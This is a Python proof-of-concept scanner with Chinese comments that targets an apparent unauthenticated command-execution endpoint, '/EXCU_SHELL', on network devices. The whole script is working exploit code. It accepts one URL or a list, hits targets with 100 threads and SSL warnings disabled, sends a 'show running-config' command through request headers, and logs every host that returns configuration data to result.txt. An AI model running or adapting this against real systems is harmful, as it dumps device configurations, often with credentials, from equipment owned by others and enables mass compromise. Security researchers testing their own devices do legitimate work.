import argparse
import sys
import requests
import re
import time
from multiprocessing.dummy import Pool

# 禁用SSL警告
requests.packages.urllib3.disable_warnings()

def main():
    # 创建解析器对象
    parser = argparse.ArgumentParser(description="Scan for a specific vulnerability in target URLs")
    
    # 添加命令行参数
    parser.add_argument('-u', '--url', dest='url', type=str, help="Single target URL to scan")
    parser.add_argument('-f', '--file', dest='file', type=str, help="File containing list of target URLs")
    
    # 解析命令行参数
    args = parser.parse_args()

    # 根据参数调用不同的函数
    if args.url and not args.file:
        poc(args.url)
    
    elif not args.url and args.file:
        url_list = []
        
        # 从文件中读取URL列表
        with open(args.file, 'r', encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        
        # 使用多线程池处理URL列表
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        # 打印用法信息
        print(f"Usage:\n\t python3 {sys.argv[0]} -h ")

# 漏洞检测函数
def poc(target):
    # 构造请求URL
    payload_url = '/EXCU_SHELL'
    url = target + payload_url
    
    # 设置请求头和数据
    header = {
        'Cmdnum': '1',
        'Command1': 'show running-config',
        'Confirm1': 'n',
        'User-Agent': 'Java/1.8.0_381',
        'Accept': 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
        'Connection': 'close'
    }

    try:
        # 发送GET请求
        res1 = requests.get(url=target, headers=header, timeout=10)
        if res1.status_code == 200:
            # 发送POST请求
            res2 = requests.post(url=url, headers=header,timeout=10)
            
            # 检查返回结果中是否包含关键字
            if "user" in res2.text:
                print(f'[+] Vulnerability found at {target}')
                
                # 将有漏洞的URL写入文件
                with open('result.txt', 'a', encoding='utf-8') as f:
                    f.write(target + "\n")
            else:
                print(f'[-] No vulnerability found at {target}')
    except Exception as e:
        print(f'[*] Issue accessing URL {target}, please test manually')

if __name__ == '__main__':
    main()
